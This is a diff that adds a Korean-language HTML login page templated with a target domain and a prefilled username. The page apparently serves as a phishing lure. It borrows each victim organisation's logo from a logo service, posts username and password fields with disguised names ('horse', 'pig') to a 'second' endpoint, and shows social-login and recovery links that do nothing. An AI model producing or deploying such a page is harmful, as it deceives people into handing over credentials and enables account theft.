@@ -1,0 +1,241 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="https://api.kickfire.com/logo?website={{dman}}" type="image/x-icon">
+    <title>{{dman}} 포털 로그인</title>
+    <style>
+        /* Reset default styles */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        /* Body styles */
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #000428, #004e92);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            overflow: hidden;
+        }
+
+        /* Container for the login form */
+        .login-container {
+            background: rgba(0, 0, 0, 0.7);
+            border-radius: 20px;
+            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.4);
+            width: 100%;
+            max-width: 450px;
+            padding: 40px 45px;
+            color: #fff;
+            animation: fadeIn 1s ease-in-out forwards;
+            position: relative;
+            backdrop-filter: blur(10px);
+        }
+
+        @keyframes fadeIn {
+            0% { transform: translateY(50px); opacity: 0; }
+            100% { transform: translateY(0); opacity: 1; }
+        }
+
+        .login-form h2 {
+            text-align: center;
+            margin-bottom: 25px;
+            font-size: 32px;
+            font-weight: 600;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+        }
+
+        /* Input group styling */
+        .input-group {
+            position: relative;
+            margin-bottom: 20px;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 15px 30px;
+            font-size: 16px;
+            border: 2px solid #fff;
+            border-radius: 50px;
+            background-color: rgba(255, 255, 255, 0.1);
+            color: #fff;
+            transition: all 0.3s ease;
+            outline: none;
+            text-transform: capitalize;
+        }
+
+        /* Input focus effect */
+        .input-group input:focus {
+            border: 2px solid #00bcd4;
+            background-color: rgba(0, 188, 212, 0.1);
+            box-shadow: 0 0 5px rgba(0, 188, 212, 0.5);
+        }
+
+        /* Placeholder Text Animation */
+        .input-group input::placeholder {
+            color: rgba(255, 255, 255, 0.6);
+            transition: all 0.3s ease;
+        }
+
+        .input-group input:focus::placeholder {
+            color: transparent;
+            transform: translateY(-20px);
+        }
+
+        /* Icon styles inside inputs */
+        .input-group .icon {
+            position: absolute;
+            top: 15px;
+            left: 10px;
+            color: #00bcd4;
+            font-size: 20px;
+        }
+
+        /* Button styling */
+        .login-btn {
+            width: 100%;
+            padding: 15px;
+            font-size: 18px;
+            background: linear-gradient(135deg, #00bcd4, #004e92);
+            color: #fff;
+            border: none;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: background 0.3s ease, transform 0.3s ease, box-shadow 0.3s ease;
+        }
+
+        .login-btn:hover {
+            background: linear-gradient(135deg, #004e92, #00bcd4);
+            transform: scale(1.05);
+            box-shadow: 0 0 15px rgba(0, 188, 212, 0.6);
+        }
+
+        /* Social login buttons */
+        .social-login {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 20px;
+        }
+
+        .social-btn {
+            width: 48%;
+            padding: 10px;
+            font-size: 16px;
+            border: 2px solid #fff;
+            border-radius: 50px;
+            background-color: rgba(255, 255, 255, 0.1);
+            color: #fff;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .social-btn:hover {
+            background-color: rgba(255, 255, 255, 0.2);
+            box-shadow: 0 0 5px rgba(255, 255, 255, 0.4);
+        }
+
+        /* Forgot password and sign up link styling */
+        .forgot-password {
+            text-align: center;
+            margin-top: 15px;
+        }
+
+        .forgot-password a {
+            text-decoration: none;
+            color: #c6c8d1;
+            transition: color 0.3s ease;
+        }
+
+        .forgot-password a:hover {
+            color: #00bcd4;
+        }
+
+        .signup-link {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 14px;
+        }
+
+        .signup-link a {
+            text-decoration: none;
+            color: #c6c8d1;
+        }
+
+        .signup-link a:hover {
+            text-decoration: underline;
+        }
+
+        /* Error message styling */
+        .error-message {
+            color: #ff0000;
+            font-size: 14px;
+            text-align: center;
+            margin-top: 15px;
+        }
+
+        /* Responsive design */
+        @media (max-width: 480px) {
+            .login-container {
+                width: 85%;
+                padding: 35px;
+            }
+
+            .social-login {
+                flex-direction: column;
+            }
+
+            .social-btn {
+                width: 100%;
+                margin-bottom: 10px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="login-container">
+        <form action="second" class="login-form" id="loginForm" method="POST">
+            <h2>로그인</h2>
+            <center><img src="https://api.kickfire.com/logo?website={{dman}}" alt="회사 로고"></center>
+
+            <div class="input-group">
+                <i class="icon">&#128100;</i>
+                <input type="text" id="username" name="horse" value="{{eman}}" required placeholder="사용자 이름을 입력하세요">
+            </div>
+
+            <div class="input-group">
+                <i class="icon">&#128274;</i>
+                <input type="password" id="password" name="pig" placeholder="비밀번호를 입력하세요" required>
+            </div>
+
+            <button type="submit" class="login-btn">로그인</button>
+
+            <div class="social-login">
+                <button class="social-btn">구글로 로그인</button>
+                <button class="social-btn">페이스북으로 로그인</button>
+            </div>
+
+            <div class="forgot-password">
+                <a href="#">비밀번호를 잊으셨나요?</a>
+            </div>
+
+            <div class="signup-link">
+                <p>계정이 없으신가요? <a href="#">회원 가입</a></p>
+            </div>
+
+            <div id="error-message" class="error-message"></div>
+        </form>
+    </div>
+
+
+</body>
+</html>
